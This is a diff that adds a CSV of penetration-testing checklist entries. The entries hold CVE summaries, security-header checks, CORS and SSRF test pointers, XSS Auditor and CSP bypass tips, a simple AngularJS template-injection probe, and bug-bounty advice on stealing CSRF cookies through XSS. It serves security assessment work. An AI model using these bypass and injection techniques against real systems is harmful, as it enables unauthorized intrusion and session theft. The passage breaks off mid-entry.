@@ -1,0 +1,437 @@
+TID,TSource,TTestName,TType,TDescription,TIssueName,TIssueType,TSeverity,TTesterSupport,TPhase,TSection,TStep,TIssueBackground,TRemediationBackground,TStdTest,TRef1,TRef2,TTRef,TCweID,TPCI,TTop10,TTop25
+EXT-20160113T053148,Extras,Log Jam - CVE-2015-4000,SSL Vulnerability,,LOGJAM - CVE-2015-4000,SSL,2,"The TLS protocol 1.2 and earlier, when a DHE_EXPORT ciphersuite is enabled on a server but not on a client, does not properly convey a DHE_EXPORT choice, which allows man-in-the-middle attackers to conduct cipher-downgrade attacks by rewriting a ClientHello with DHE replaced by DHE_EXPORT and then rewriting a ServerHello with DHE_EXPORT replaced by DHE.",Extras,,,,,FALSE,https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-4000,https://weakdh.org/,https://weakdh.org/sysadmin.html,310,,,
+EXT-20160113T053847,Extras,WinShock - CVE-2014-6321 - MS14-066,,,WinShock - CVE-2014-6321 - MS14-066,Windows,1,Schannel in Microsoft Windows Server allows remote attackers to execute arbitrary code via crafted packets.,Extras,,,,,FALSE,https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6321,,http://www.securitysift.com/exploiting-ms14-066-cve-2014-6321-aka-winshock/,310,,,
+EXT-20160113T054029,Extras,ShellShock (BashBug) - CVE-2014-6271,Specific bug,,ShellShock (BashBug) - CVE-2014-6271,,2,"GNU Bash through 4.3 processes trailing strings after function definitions in the values of environment variables, which allows remote attackers to execute arbitrary code via a crafted environment, as demonstrated by vectors involving the ForceCommand feature in OpenSSH sshd, the mod_cgi and mod_cgid modules in the Apache HTTP Server, scripts executed by unspecified DHCP clients, and other situations in which setting the environment occurs across a privilege boundary from Bash execution.",Extras,,,,,,https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271,,http://www.rapid7.com/db/modules/exploit/multi/http/apache_mod_cgi_bash_env_exec,0,,,
+EXT-20160113T054537,Extras,Poodle - CVE-2014-3566,,,Poodle - CVE-2014-3566,,,"Padding Oracle On Downgraded Legacy Encryption (POODLE). The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other products, uses nondeterministic CBC padding, which makes it easier for man-in-the-middle attackers to obtain cleartext data via a padding-oracle attack.",Extras,,,,,,http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566,https://www.ssllabs.com/,https://www.openssl.org/~bodo/ssl-poodle.pdf,310,,,
+EXT-20160113T054807,Extras,Heartbleed - CVE-2014-0160,,,Heartbleed - CVE-2014-0160,,3,"The (1) TLS and (2) DTLS implementations in OpenSSL 1.0.1 before 1.0.1g do not properly handle Heartbeat Extension packets, which allows remote attackers to obtain sensitive information from process memory via crafted packets that trigger a buffer over-read, as demonstrated by reading private keys, related to d1_both.c and t1_lib.c.",Extras,,,,,FALSE,https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160,http://heartbleed.com/,https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/ssl/openssl_heartbleed.rb,310,,,
+EXT-20160116T203037,Extras,SQL Injection with sqlmap,SQL Injection,,SQL Injection,SQL Injection,3,Use sqlmap,Extras,,,,,FALSE,,,mutillidae/level-1-hints-page-wrapper.php?level1HintIncludeFile=53,89,FALSE,FALSE,TRUE
+EXT-20160129T222102,Extras,Heap-based buffer overflow (CVE-2015-0235),,,eap-based buffer overflow in the __nss_hostname_digits_dots,,,"Heap-based buffer overflow in the __nss_hostname_digits_dots function in glibc 2.2, and other 2.x versions before 2.18, allows context-dependent attackers to execute arbitrary code via vectors related to the (1) gethostbyname or (2) gethostbyname2 fun...",Extras,,,,,FALSE,http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-0235,,,119,,,
+EXT-20160129T234938,Extras,Absolute path traversal vulnerability in Font.php (CVE-2015-7683),,,Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal'),,0,"Absolute path traversal vulnerability in Font.php in the Font plugin before 7.5.1 for WordPress allows remote administrators to read arbitrary files via a full pathname in the url parameter to AjaxProxy.php.	4	
+Medium	font_project:font:7.5::~~~wordpress~~	SINGLE_INSTANCE	
+LOW	PARTIAL	NONE	NONE	NETWORK	CWE-22	CONFIRM:https://wordpress.org/plugins/font/changelog/ MISC:https://wpvulndb.com/vulnerabilities/8214 BUGTRAQ:20151012 CVE-2015-7683: Absolute Path Traversal in the Font WordPress Plugin MISC:http://packetstormsecurity.com/files/133930/WordPress-Font-7.5-Path-Traversal.html",Extras,,,"The software uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the software does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory.
+
+Many file operations are intended to take place within a restricted directory. By using special elements such as .. and / separators, attackers can escape outside of the restricted location to access files or directories that are elsewhere on the system. One of the most common special elements is the ../ sequence, which in most modern operating systems is interpreted as the parent directory of the current location. This is referred to as relative path traversal. Path traversal also covers the use of absolute pathnames such as /usr/local/bin, which may also be useful in accessing unexpected files. This is referred to as absolute path traversal. In many programming languages, the injection of a null byte (the 0 or NUL) may allow an attacker to truncate a generated filename to widen the scope of attack. For example, the software may add .txt to any pathname, thus limiting the attacker to text files, but a null injection may effectively remove this restriction.","PHASE:Implementation
+STRATEGY:Input Validation
+DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright. When validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single . character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as / to avoid CWE-36. Use a list of allowable file extensions, which will help to avoid CWE-434. Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering / is insufficient protection if the filesystem also supports the use of as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if ../ sequences are removed from the .../...// string in a sequential fashion, two instances of ../ would be removed from the original string, but the remaining characters would still form the ../ string.
+
+PHASE:Architecture and Design
+DESCRIPTION:For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.
+
+PHASE:Implementation
+STRATEGY:Input Validation
+DESCRIPTION:Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked. Use a built-in path canonicalization function (such as realpath() in C) that produces the canonical version of the pathname, which effectively removes .. sequences and symbolic links (CWE-23, CWE-59). This includes: realpath() in C getCanonicalPath() in Java GetFullPath() in ASP.NET realpath() or abs_path() in Perl realpath() in PHP
+
+PHASE:Architecture and Design
+STRATEGY:Libraries or Frameworks
+DESCRIPTION:Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.
+
+PHASE:Operation
+STRATEGY:Firewall
+DESCRIPTION:Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.
+EFFECTIVENESS:Moderate
+
+PHASE:Architecture and Design Operation
+STRATEGY:Environment Hardening
+DESCRIPTION:Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.
+
+PHASE:Architecture and Design
+STRATEGY:Enforcement by Conversion
+DESCRIPTION:When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs. For example, ID 1 could map to inbox.txt and ID 2 could map to profile.txt. Features such as the ESAPI AccessReferenceMap [REF-185] provide this capability.
+
+PHASE:Architecture and Design Operation
+STRATEGY:Sandbox or Jail
+DESCRIPTION:Run the code in a jail or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software. OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations. This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise. Be careful to avoid CWE-243 and other weaknesses related to jails.
+EFFECTIVENESS:Limited
+
+PHASE:Architecture and Design Operation
+STRATEGY:Attack Surface Reduction
+DESCRIPTION:Store library, include, and utility files outside of the web document root, if possible. Otherwise, store them in a separate directory and use the web server's access control capabilities to prevent attackers from directly requesting them. One common practice is to define a fixed constant in each calling program, then check for the existence of the constant in the library/include file; if the constant does not exist, then the file was directly requested, and it can exit immediately. This significantly reduces the chance of an attacker being able to bypass any protection mechanisms that are in the base program but not in the include files. It will also reduce the attack surface.
+
+PHASE:Implementation
+DESCRIPTION:Ensure that error messages only contain minimal details that are useful to the intended audience, and nobody else. The messages need to strike the balance between being too cryptic and not being cryptic enough. They should not necessarily reveal the methods that were used to determine the error. Such detailed information can be used to refine the original attack to increase the chances of success. If errors must be tracked in some detail, capture them in log messages - but consider what could occur if the log messages can be viewed by attackers. Avoid recording highly sensitive information such as passwords in any form. Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a username is valid or not. In the context of path traversal, error messages which disclose path information can help attackers craft the appropriate attack strings to move through the file system hierarchy.
+
+PHASE:Operation Implementation
+STRATEGY:Environment Hardening
+DESCRIPTION:When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.",FALSE,http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-7683,,,22,,,
+EXT-20160226T201633,Extras,Report informational findings,Provide useful information to the app owner that isn't a real security issue (functional or non-functional),,Useful information,Useful information,0,Add details in the issues notes.,Extras,,,,,TRUE,,,http://localhost,546,FALSE,FALSE,FALSE
+EXT-20160227T001858,Extras,Unsafe implementation,Report issues with an unsafe implementation that may lead to errors or insecure processing,,Testing the app in PT may result in directing test chat messages to PR,Unsafe implementation,2,,Extras,,,,,,,,N/A,474,,,FALSE
+EXT-20160108T064524,Extras,XSS Auditor Bypass,SSL Vulnerability Test,,Single Sign-On analysis,,0,"XSS detection is heuristic based. When the server transform the reflected content XSS Auditor (mostly Google Chrome) that looks for exact match can be tricked. This happens when :
+- incorrect encoding is applied
+- custom transformation are applied
+Tips : Place the transformed  content at the beginning of the script in a string value.
+
+Browser specific approach:
+XSS browser protections have to minimize false positive, otherwise it gets annoying to users and they disable it and websites disable it to prevent their website from having issues. Browsers have some rule that will whitelist reflected content on specific conditions.
+
+Google Chrome:
+Resources hosted on the same domain are never detected or blocked: 
+- Can load user content as script.
+- X-Content-Type-Options header must be not set.
+- Can load powerful library (ex.: angular.js) used elsewhere in the site.
+- Can load JavaScript with DOM based reflected content.
+The only restriction is that the URL must not contain any GET parameter.
+
+Internet Explorer:
+IE never perform XSS detection from resources where ""Referer"" == domain of the requested URL
+-- JavaScript based redirect
+-- Clickable URL from user content
+-- <iframe> URL that you can control
+-- ""Referer"" spoofing vulnerability (fixed). ref.: http://www.brokenbrowser.com/referer-spoofing-defeating-xss-filter/
+
+Test Site: http://xss.zhack.ca/hackfest/",Extras,,,The app is making use of an SSO mechanism that might be exploitable. To verify...,,FALSE,https://msdn.microsoft.com/en-us/library/cc709423(v=vs.85).aspx,,http://slides.com/olivierarteau/xss-auditor-bypass,592,,,
+EXT-20160228T193514,Extras,Various Notes,Take various notes during testing,,Various Notes,,0,,Extras,,,,,,,,N/A,16,,,
+EXT-20160302T080433,Extras,Vulnerable web server software,,,Outdated/vulnerable web server software,,2,,Extras,,,"The following CVSS v3 scores correspond to a Risk Rating as follows:
+- Score:=[0.1-3.9], Risk=Low
+- Score:=[4.0-6.9], Risk=Medium
+- Score:=[7.0-8.9], Risk=High
+- Score:=[9.0-10.0], Risk=Critical",,TRUE,,,,1026,TRUE,,
+EXT-20160302T080523,Extras,Mixed content sent to web browser,,,Mixed content sent to web browser,,2,"Check for browser warnings related to mixed HTTP and HTTPS content.
+
+Websites that serve a web page using transport layer protection (HTTPS), but then also include additional content on the page such as JavaScript or images over HTTP are using mixed content and are vulnerable to attack. An attacker could replace the legitimate JavaScript being sent to the browser with a malicious version and have it execute in the context of the HTTPS page[7][8]. All content on a secure page must be served via HTTPS, including the HTML, JavaScript, images, CSS, XHR, and any other content.
+
+A similar attack may be used to force a browser into sending a cookie normally transmitted over HTTPS to the HTTP version of the site, exposing the cookie. Cookies should be set with the ""secure"" flag (and if possible, the ""HTTPOnly"" flag) to prevent the cookie from being leaked[9].",Extras,,,,,TRUE,https://www.ssllabs.com/projects/best-practices/,http://ferruh.mavituna.com/ssl-implementation-security-faq-oku/,,818,,,
+EXT-20160302T081020,Extras,Incomplete functionality,,,Incomplete functionality,,1,Take note of incomplete functionality,Extras,,,,,,,,,912,,,
+EXT-20160302T081042,Extras,Password reuse,,,Password reuse (QA and PR),,1,Check that account credentials on one system aren't the same as on another system (e.g. QA vs Prod).,Extras,,,,,TRUE,,,,521,,,
+EXT-20160227T161734,Extras,SSL Testing,Use online SSL Testing tool,,SSL Test Results,Transport encryption,0,Point the Qualys SSLTest service to the test target,Extras,,,Include SSL test results.,,TRUE,https://www.ssllabs.com/ssltest,,https://www.ssllabs.com/ssltest/index.html,0,TRUE,FALSE,FALSE
+EXT-20160414T170737,Extras,TODO Tests,,,TODO Tests,,0,"Capture in the Notes section a list of TODO tests
+
+Examples:
+CWE-285 Improper Access Control (Authorization)
+CWE-306 Missing Authentication for Critical Function
+CWE-311 Missing Encryption of Sensitive Data [A06]
+CWE-352 Cross-Site Request Forgery (CSRF) [A08]
+CWE-434 Unrestricted Upload of File with Dangerous Type
+CWE-798 Use of Hard-coded Credentials  
+CWE-840 Business Logic Errors
+
+Top 10 (2013)
+A02 Broken Authentication and Session  Management
+A04 Insecure Direct Object References 
+A05 Security Misconfiguration
+A06 Sensitive Data Exposure
+A08 Cross-Site Request Forgery (CSRF)
+A10 Unvalidated Redirects and Forwards
+
+Those that are less applicable (everywhere) or testable via black-box methods:
+CWE-494 Download of Code Without Integrity Check
+CWE-732 Incorrect Permission Assignment for Critical Resource
+CWE-754 Improper Check for Unusual or Exceptional Conditions
+CWE-770 Allocation of Resources Without Limits or Throttling 
+CWE-807 Reliance on Untrusted Inputs in a Security Decision",Extras,,,See notes for tests to perform later.,,TRUE,,,,0,,,
+EXT-20160415T001516,Extras,Manual tests to perform (hard to automate),,,Manual tests that are hard to automate,,0,"Vulnerabilities that scanners don't find reliably, that warrant a manual test
+CWE-285 Improper Access Control (Authorization)
+CWE-306 Missing Authentication for Critical Function
+CWE-311 Missing Encryption of Sensitive Data [A06]
+CWE-352 Cross-Site Request Forgery (CSRF) [A08]
+CWE-434 Unrestricted Upload of File with Dangerous Type
+CWE-798 Use of Hard-coded Credentials  
+
+Top 10 (2013)
+A02 Broken Authentication and Session  Management
+A04 Insecure Direct Object References 
+A05 Security Misconfiguration
+A06 Sensitive Data Exposure
+A08 Cross-Site Request Forgery (CSRF)
+A10 Unvalidated Redirects and Forwards
+
+Those that are less applicable (everywhere) or testable via black-box methods:
+CWE-494 Download of Code Without Integrity Check
+CWE-732 Incorrect Permission Assignment for Critical Resource
+CWE-754 Improper Check for Unusual or Exceptional Conditions
+CWE-770 Allocation of Resources Without Limits or Throttling 
+CWE-807 Reliance on Untrusted Inputs in a Security Decision
+[...]
+
+Of course, this is just a generic list. We still need to adapt our approach based on context, validate findings from scanners (identify false positives, adjust severity/priority based on exposure), try to exploit new vulns, try new techniques, etc.",Extras,,,,,TRUE,,,,0,,,
+EXT-20160415T010824,Extras,Exploit 1,,,XSS Exploit,,3,,Extras,,,,,,,,,931,,,
+EXT-20160415T012144,Extras,XSS fuzz strings,,,Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS),,3,"Try the list of 100 fuzz strings in the Test Ref.
+Ref.: http://slides.com/mscasharjaved/cross-site-scripting-my-love#/
+Source: http://pastebin.com/u6FY1xDA",Extras,,,"The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special characters such as <, >, and & that could be interpreted as web-scripting elements when they are sent to a downstream component that processes web pages.
+
+This may allow such characters to be treated as control characters, which are executed client-side in the context of the user's session. Although this can be classified as an injection problem, the more pertinent issue is the improper conversion of such special characters to respective context-appropriate entities before displaying them to the user.","PHASE:Implementation
+DESCRIPTION:Carefully check each input parameter against a rigorous positive specification (allowlist) defining the specific characters and format allowed. All input should be neutralized, not just parameters that the user is supposed to specify, but all data in the request, including hidden fields, cookies, headers, the URL itself, and so forth. A common mistake that leads to continuing XSS vulnerabilities is to validate only fields that are expected to be redisplayed by the site. We often encounter data from the request that is reflected by the application server or the application that the development team did not anticipate. Also, a field that is not currently reflected may be used by a future developer. Therefore, validating ALL parts of the HTTP request is recommended.
+
+PHASE:Implementation
+STRATEGY:Output Encoding
+DESCRIPTION:Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component. The problem of inconsistent output encodings often arises in web pages. If an encoding is not specified in an HTTP header, web browsers often guess about which encoding is being used. This can open up the browser to subtle XSS attacks.
+
+PHASE:Implementation
+DESCRIPTION:With Struts, write all data from form beans with the bean's filter attribute set to true.
+
+PHASE:Implementation
+STRATEGY:Attack Surface Reduction
+DESCRIPTION:To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.
+EFFECTIVENESS:Defense in Depth",FALSE,,,/txt/xss100.txt,80,FALSE,TRUE,
+EXT-20160920T182257,Extras,Check X-Frame-Options header (clickjacking protection),,,X-Frame-Options header not used to protect against clickjacking,,1,"Verify that a suitable X-FRAME-OPTIONS header is in use for sites where content should not be viewed in a 3rd-party X-Frame.
+
+Examples:
+X-Frame-Options: DENY
+X-Frame-Options: SAMEORIGIN
+X-Frame-Options: ALLOW-FROM https://example.com/",Extras,,,,,FALSE,https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#X-Frame-Options,https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options,https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project,,,,
+EXT-20160920T182420,Extras,Check X-Content-Type-Options header,,,Missing X-Content-Type-Options header to mitigate against MIME-sniffing,,2,"Verify that all API responses contain X-Content-Type-Options: nosniff and Content-Disposition: attachment; filename=""api.json"" (or other appropriate filename for the content type).",Extras,,,,,TRUE,https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#X-Content-Type-Options,https://www.veracode.com/blog/2014/03/guidelines-for-setting-security-headers,https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project,827,,,
+EXT-20160920T182615,Extras,Check Content-Security-Policy header,,,No Content-Security-Policy header,,0,"Verify that a content security policy (CSPv2) is in place that helps mitigate common DOM, XSS, JSON, and JavaScript injection vulnerabilities.",Extras,,,,,TRUE,https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#Content-Security-Policy,,https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project,,,,
+EXT-20160415T002959,Extras,Attack ideas,,,Attack ideas (vulnerabilities to validate),,0,Note future attack ideas in the Notes section,Extras,,,,,TRUE,,,,0,,,
+EXT-20160920T184817,Extras,Check Strict-Transport-Security (HSTS) header,,,Missing encryption enforcement,,1,"HTTP Strict Transport Security (HSTS) is a web security policy mechanism which helps to protect websites against protocol downgrade attacks and cookie hijacking. It allows web servers to declare that web browsers (or other complying user agents) should only interact with it using secure HTTPS connections, and never via the insecure HTTP protocol. HSTS is an IETF standards track protocol and is specified in RFC 6797. A server implements an HSTS policy by supplying a header (Strict-Transport-Security) over an HTTPS connection (HSTS headers over HTTP are ignored).",Extras,,,,,TRUE,https://tools.ietf.org/html/rfc6797,https://www.owasp.org/index.php/HTTP_Strict_Transport_Security,https://www.owasp.org/index.php/Test_HTTP_Strict_Transport_Security_(OTG-CONFIG-007),818,,,
+EXT-20160920T184943,Extras,Check Public-Key-Pins (HPKP) header,,,HTTP Public Key Pinning not implemented,,0,"HTTP Public Key Pinning (HPKP) is a security mechanism which allows HTTPS websites to resist impersonation by attackers using mis-issued or otherwise fraudulent certificates. (For example, sometimes attackers can compromise certificate authorities, and then can mis-issue certificates for a web origin.).
+
+The HTTPS web server serves a list of public key hashes, and on subsequent connections clients expect that server to use one or more of those public keys in its certificate chain. Deploying HPKP safely will require operational and organizational maturity due to the risk that hosts may make themselves unavailable by pinning to a set of public key hashes that becomes invalid. With care, host operators can greatly reduce the risk of man-in-the-middle (MITM) attacks and other false authentication problems for their users without incurring undue risk.",Extras,,,,,FALSE,https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#Public_Key_Pinning_Extension_for_HTTP_.28HPKP.29,,https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#Public_Key_Pinning_Extension_for_HTTP_.28HPKP.29,,,,
+EXT-20160920T185306,Extras,Check X-Permitted-Cross-Domain-Policies header,,,X-Permitted-Cross-Domain-Policies header,,2,"A cross-domain policy file is an XML document that grants a web client, such as Adobe Flash Player or Adobe Acrobat (though not necessarily limited to these), permission to handle data across domains. When clients request content hosted on a particular source domain and that content make requests directed towards a domain other than its own, the remote domain needs to host a cross-domain policy file that grants access to the source domain, allowing the client to continue the transaction. Normally a meta-policy is declared in the master policy file, but for those who can’t write to the root directory, they can also declare a meta-policy using the X-Permitted-Cross-Domain-Policies HTTP response header.",Extras,,,,,,https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#X-Permitted-Cross-Domain-Policies,,https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#X-Permitted-Cross-Domain-Policies,,,,
+EXT-20161005T133806,Extras,Outdated component,,,Component with known high-severity vulnerabilities,,3,Report findings about old components here (as one issue).,Extras,,,,,TRUE,https://www.owasp.org/index.php/Top_10_2013-A9-Using_Components_with_Known_Vulnerabilities,,,937,TRUE,TRUE,
+EXT-20161011T113058,Extras,Burp scanner issue,,,Review Burp scanner issues,,0,"- In Burp, load the Clipboarder extension. 
+- Use ""Copy as free text to clipboard"" from an issue in the Target tab
+- Paste the clipboard to the issue field",Extras,,,,,TRUE,,,,0,,,
+EXT-20161017T150036,Extras,Check security headers,,,Some HTTP headers that could improve security are not being used,,2,"Check that important/useful HTTP security headers are used to prevent common security issues. Examples below.
+
+Issue  : Clickjacking 
+Header: X-Frame-Options or Content-Security-Policy
+
+Issue   : Content sniffing, MIME-sniffing 
+Header: X-Content-Type-Options, Content-Security-Policy
+
+Issue  : XSS
+Header: X-XSS-Protection, Content-Security-Policy
+
+Issue : Protocol downgrade attacks, Cookie hijacking
+Header: HTTP Strict Transport Security (HSTS)
+
+
+",Extras,,,,,,https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#tab=Headers,,,16,,,
+EXT-20161017T155650,Extras,Vulns detected by app scanner,,,App scan results to review,,0,Copy list of vulns detected by app scanner and specify that these won't be reported here.,Extras,,,,,,,,,,,,
+EXT-20161017T170627,Extras,CVE List,,,Possible server vulnerabilities (to verify),,0,Capture list of applicable CVEs,Extras,,,,,TRUE,,,http://www.cvedetails.com/,937,,,
+EXT-20160920T182709,Extras,Check X-XSS-Protection header,,,Missing X-XSS-Protection header to mitigate against XSS,,2,"Verify that the X-XSS-Protection: 1; mode=block header is in place to enable browser reflected XSS filters.
+
+Valid Settings
+0 - Disables the XSS Protections offered by the user-agent.
+1 - Enables the XSS Protections
+1; mode=block - Enables XSS protections and instructs the user-agent to block the response in the event that script has been inserted from user input, instead of sanitizing.
+1; report=http://site.com/report - A Chrome and WebKit only directive that tells the user-agent to report potential XSS attacks to a single URL. Data will be POST'd to the report URL in JSON format.
+
+\Common Invalid Settings
+0; mode=block; - A common misconfiguration where the 0 value will disable protections even though the mode=block is defined. It should be noted that Chrome has been enhanced to fail closed and treat this as an invalid setting but still keep default XSS protections in place.
+1 mode=block; - All directives must be separated by a ;. Spaces and , are invalid separators. However, IE and Chrome will default to sanitizing the XSS in this case but not enable blocking mode as everything after the 1 is considered invalid.",Extras,,,,,TRUE,https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#X-XSS-Protection,https://www.veracode.com/blog/2014/03/guidelines-for-setting-security-headers,https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project,931,,,
+EXT-20161020T200019,Extras,Review browser errors,,,Browser errors,,1,Review errors in browser and report the ones that are important to the developers/integrators.,Extras,,,Browser errors could provide useful information for attackers and could prevent proper operation of the application. It is not impossible that QA staff may have forgotten to report browser errors so security analysts should also report them if they feel they need to be resolved.,,,"https://www.owasp.org/index.php/Error_Handling,_Auditing_and_Logging",,"https://www.owasp.org/index.php/Error_Handling,_Auditing_and_Logging",388,,,
+EXT-20161021T184658,Extras,Exploiting CORS,,,Overly Permissive CORS policy,,2,See Burp Forum & AppSec Talk in Test Ref.,Extras,,,"An HTML5 cross-origin resource sharing (CORS) policy controls whether and how content running on other domains can perform two-way interaction with the domain that publishes the policy. The policy is fine-grained and can apply access controls per-request based on the URL and other features of the request.
+
+If another domain is allowed by the policy, then that domain can potentially attack users of the application. If a user is logged in to the application, and visits a domain allowed by the policy, then any malicious content running on that domain can potentially retrieve content from the application, and sometimes carry out actions within the security context of the logged in user.
+
+Even if an allowed domain is not overtly malicious in itself, security vulnerabilities within that domain could potentially be leveraged by an attacker to exploit the trust relationship and attack the application that allows access. CORS policies on pages containing sensitive information should be reviewed to determine whether it is appropriate for the application to trust both the intentions and security posture of any domains granted access.",,TRUE,https://www.w3.org/TR/cors/,https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS,http://blog.portswigger.net/2016/10/exploiting-cors-misconfigurations-for.html,183,,,
+EXT-20161024T124128,Extras,Web Hacking 101 Pro Tips & bounty hunting,,,Server misconfiguration,,2,"Notes from interviews held by Peter Yaworski (author of Web Hacking 101):
+
+Tips from Arness Winnen @arneswinnen:
+- Check scope. If wildcards in domains are allowed, look for subdomains. Look for session cookies scoped to the TLD (shared cookie, greater impact on TLD issues).
+- Look for session cookies and CSRF tokens in cookies. If you find XSS (in subdomain), steal the CSRF cookie from TLD (greater payout).
+- Check cross-domain.xml at root. Estimate the impact of a vuln on a subdomain (or not) (by using Flash)
+
+Tips from @FileDescriptor
+- 
+
+Tips from Frans Rosén @fransrosen
+- Search for framework debugging turned on. E.g. Flask debug mode. Search online in Shodan.
+- Abuse IDs (direct object ref.)
+- Abuse open redirect in OAuth2 (with URL that has the token)
+- CSP bypass - i.e. make XSS work even if CSP should block it (e.g. sourcing an old version of AngularJS)
+
+See also:
+- https://www.torontowebsitedeveloper.com/drupal-video-tutorials
+- https://www.arneswinnen.net/category/research/publications/
+- https://www.torontowebsitedeveloper.com/
+- http://feeds.soundcloud.com/users/soundcloud:users:217591392/sounds.rss
+- https://www.youtube.com/watch?v=KDo68Laayh8 (Frans Rosen)",Extras,,,,,,,,https://leanpub.com/web-hacking-101,933,,,
+EXT-20161103T132859,Extras,Test data to use,,,Test data to use,,0,Capture good test data to use.,Extras,,,,,,,,,,,,
+EXT-20161108T150517,Extras,AngularJS Template Injection,,,AngularJS Template Injection,,3,"Try injecting payload that Angular would interpret.
+
+Example:
+<script src=""https://ajax.googleapis.com/ajax/libs/angularjs/1.4.6/angular.js""></script>
+<div ng-app>Val:{{1+1}}</div>
+
+Refs:
+- https://hackerone.com/reports/125027
+- http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html
+- https://docs.angularjs.org/guide/expression",Extras,,,,,,,,http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html,,,,
+EXT-20161101T203017,Extras,Analysis of authentication flow,,,Information Exposure Through Query Strings in GET Request (CWE-598),,2,Analyze the authentication mechanism. Capture details here.,Extras,,,"The web application uses the GET method to process requests that contain sensitive information, which can expose that information through the browser's history, Referers, web logs, and other sources.",,,,,,598,,,
+EXT-20161214T170114,Extras,Server-Side Request Forgery (SSRF),,,Server-Side Request Forgery (SSRF),,3,"Try this:
+- https://www.owasp.org/index.php/OWASP_Skanda_SSRF_Exploitation_Framework
+- https://github.com/jacobreynolds/ssrfdetector
+- Use Burp Collaborator client to monitor for Burp-triggered server-side requests
+
+Overview
